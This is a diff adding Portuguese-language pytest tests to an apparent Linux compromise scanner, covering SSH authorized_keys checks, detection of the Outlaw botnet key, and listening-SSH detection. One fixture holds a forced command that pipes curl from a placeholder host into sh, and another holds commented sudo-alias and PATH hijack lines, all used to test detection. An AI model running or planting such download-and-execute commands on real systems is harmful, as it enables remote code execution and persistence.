@@ -1,3 +1,4 @@
+import os
 from pathlib import Path
 
 import pytest
@@ -397,3 +398,70 @@ def test_arquivo_carregado_pelo_bashrc_tambem_e_olhado(tmp_path, pacotes):
 def test_comentario_nao_conta(tmp_path, pacotes):
     texto = BASHRC_DO_UBUNTU + "# alias sudo='/tmp/x'\n# export PATH=/tmp:$PATH\n"
     assert cacador.shell(bashrc(tmp_path / "casa", texto), cacador.Juiz(), pacotes) is None
+
+
+# --- chaves SSH autorizadas -------------------------------------------------
+
+# Uma chave ed25519 de verdade (pública, gerada só para este teste).
+CHAVE_ED25519 = "AAAAC3NzaC1lZDI1NTE5AAAAIEt2c2VjcmV0LW5hby1lLXVtYS1jaGF2ZS1yZWFs"
+ANTIGO = 1_700_000_000
+
+
+def authorized_keys(casa: Path, texto: str, mtime: float = ANTIGO) -> Path:
+    (casa / ".ssh").mkdir(parents=True, exist_ok=True)
+    arquivo = casa / ".ssh" / "authorized_keys"
+    arquivo.write_text(texto)
+    os.utime(arquivo, (mtime, mtime))
+    return arquivo
+
+
+def chaves(casa, ssh_ligado=False, agora=ANTIGO + 30 * 86400, juiz=None):
+    return list(cacador.chaves_autorizadas([casa], juiz or cacador.Juiz(), agora, ssh_ligado))
+
+
+def test_ler_chave_calcula_a_impressao_como_o_ssh_keygen():
+    c = cacador.ler_chave(f'no-pty,command="echo oi" ssh-ed25519 {CHAVE_ED25519} eu@notebook')
+    assert (c.tipo, c.comentario, c.opcoes) == ("ssh-ed25519", "eu@notebook", 'no-pty,command="echo oi"')
+    assert c.impressao.startswith("SHA256:") and "=" not in c.impressao
+
+
+def test_arquivo_vazio_ou_ausente_nao_vira_achado(tmp_path):
+    assert chaves(tmp_path / "sem-ssh") == []
+    authorized_keys(tmp_path / "casa", "# só comentário\n\n")
+    assert chaves(tmp_path / "casa") == []
+
+
+def test_chaves_antigas_sao_informativas(tmp_path):
+    authorized_keys(tmp_path, f"ssh-ed25519 {CHAVE_ED25519} eu@notebook\n")
+    [achado] = chaves(tmp_path)
+    assert achado.gravidade == "info"
+    assert "eu@notebook" in achado.mensagem and "SSH está desligado" in achado.mensagem
+
+
+def test_chave_recente_pede_atencao(tmp_path):
+    authorized_keys(tmp_path, f"ssh-ed25519 {CHAVE_ED25519} eu@notebook\n", mtime=ANTIGO + 29 * 86400)
+    [achado] = chaves(tmp_path, ssh_ligado=True)
+    assert achado.gravidade == "media"
+    assert "SSH está ligado" in achado.mensagem
+
+
+def test_chave_da_botnet_outlaw_e_alta(tmp_path):
+    authorized_keys(tmp_path, f"ssh-ed25519 {CHAVE_ED25519} eu@notebook\nssh-rsa {CHAVE_ED25519} mdrfckr\n")
+    [achado] = chaves(tmp_path)
+    assert achado.gravidade == "alta" and "Outlaw" in achado.mensagem
+
+
+def test_comando_forcado_passa_pelo_yara(tmp_path, juiz_com_yara):
+    comando = "".join(["curl -s http://exemplo.invalid/x", " | sh"])
+    authorized_keys(tmp_path, f'command="{comando}" ssh-ed25519 {CHAVE_ED25519} deploy\n')
+    [achado] = chaves(tmp_path, juiz=juiz_com_yara)
+    assert achado.gravidade == "media" and "DownloadEExecuta" in achado.mensagem
+
+
+def test_ssh_escutando(tmp_path):
+    tabela = tmp_path / "tcp"
+    cabecalho = "  sl  local_address rem_address   st\n"
+    tabela.write_text(cabecalho + "   0: 0100007F:8CA1 00000000:0000 0A\n   1: 00000000:0016 0100007F:9C40 01\n")
+    assert not cacador.ssh_escutando((tabela,))   # a 22 aparece só numa conexão já feita
+    tabela.write_text(cabecalho + "   0: 00000000:0016 00000000:0000 0A\n")
+    assert cacador.ssh_escutando((tabela,))
